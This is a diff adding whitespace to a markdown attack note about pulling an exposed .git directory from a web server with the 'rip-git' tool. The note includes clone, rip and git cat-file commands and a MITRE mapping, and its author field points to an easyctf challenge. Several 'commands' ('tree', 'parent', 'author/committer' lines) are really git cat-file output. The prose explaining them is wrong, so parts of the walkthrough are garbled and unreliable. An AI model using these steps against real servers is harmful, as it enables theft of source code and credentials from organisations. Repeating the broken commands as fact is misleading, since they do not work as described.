@@ -45,11 +45,15 @@ To use 'rip-git', the attacker only needs to have network access to the target s
 
 The business value of this attack is that it allows attackers to obtain sensitive information that can be used to carry out further attacks against the target organization. This can result in financial loss, reputational damage, and other negative consequences.
 
+ 
+
 ## Requirements
 
 1. Network access to the target server.
 
 1. The 'rip-git' tool.
+
+ 
 
 ## Defense
 
@@ -59,11 +63,15 @@ The business value of this attack is that it allows attackers to obtain sensitiv
 
 1. Implement security measures such as two-factor authentication and intrusion detection systems to detect and prevent unauthorized access to the target server.
 
+ 
+
 ## Objectives
 
 1. To obtain access to sensitive information, such as passwords, credentials, and source code.
 
 1. To carry out further attacks against the target organization.
+
+ 
 
 # Instructions
 
@@ -75,10 +83,18 @@ The business value of this attack is that it allows attackers to obtain sensitiv
 4. tree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
 5. parent 15ca375e54f056a576905b41a417b413c57df6eb
 
+ 
+
+
+
 **Code**: [[git clone https://github.com/kost/dvcs-ripper
 perl]]
 
+
+
 > The 'git clone' command is used to clone a Git repository from a remote server. In this case, the attacker is cloning the 'dvcs-ripper' repository from GitHub. The 'perl rip-git.pl' command is then used to run the 'rip-git' tool, which will automatically recover the Git repository from the target server. The 'git cat-file' command is then used to view the contents of a specific object in the Git repository. In this case, the object with the ID '07603070376d63d911f608120eb4b5489b507692' is being viewed. The 'tree' command is used to view the contents of a specific tree in the Git repository. In this case, the tree with the ID '5dae937a49acc7c2668f5bcde2a9fd07fc382fe2' is being viewed. The 'parent' command is used to view the parent object of a specific object in the Git repository. In this case, the parent of the object with the ID '15ca375e54f056a576905b41a417b413c57df6eb' is being viewed.
+
+
 
 **Command** ([[Clone repository]]):
 
@@ -86,11 +102,19 @@ perl]]
 git clone https://github.com/kost/dvcs-ripper
 ```
 
+
+
+
+
 **Command** ([[Rip git repository]]):
 
 ```bash
 perl rip-git.pl -v -u "http://web.site/.git/"
 ```
+
+
+
+
 
 **Command** ([[View file contents]]):
 
@@ -98,17 +122,29 @@ perl rip-git.pl -v -u "http://web.site/.git/"
 git cat-file -p 07603070376d63d911f608120eb4b5489b507692
 ```
 
+
+
+
+
 **Command** ([[View tree contents]]):
 
 ```bash
 tree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
 ```
 
+
+
+
+
 **Command** ([[View parent commit]]):
 
 ```bash
 parent 15ca375e54f056a576905b41a417b413c57df6eb
 ```
+
+
+
+
 
 **Command** ([[View author and committer information]]):
 
@@ -117,11 +153,17 @@ author Michael <michael@easyctf.com> 1489389105 +0000
 committer Michael <michael@easyctf.com> 1489389105 +0000
 ```
 
+
+
+
+
 **Command** ([[View file contents]]):
 
 ```bash
 git cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -153,3 +195,5 @@ git cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
 - [[Insecure Source Code Management]]
 - [[rip-git]]
 - [[Tools]]
+
+
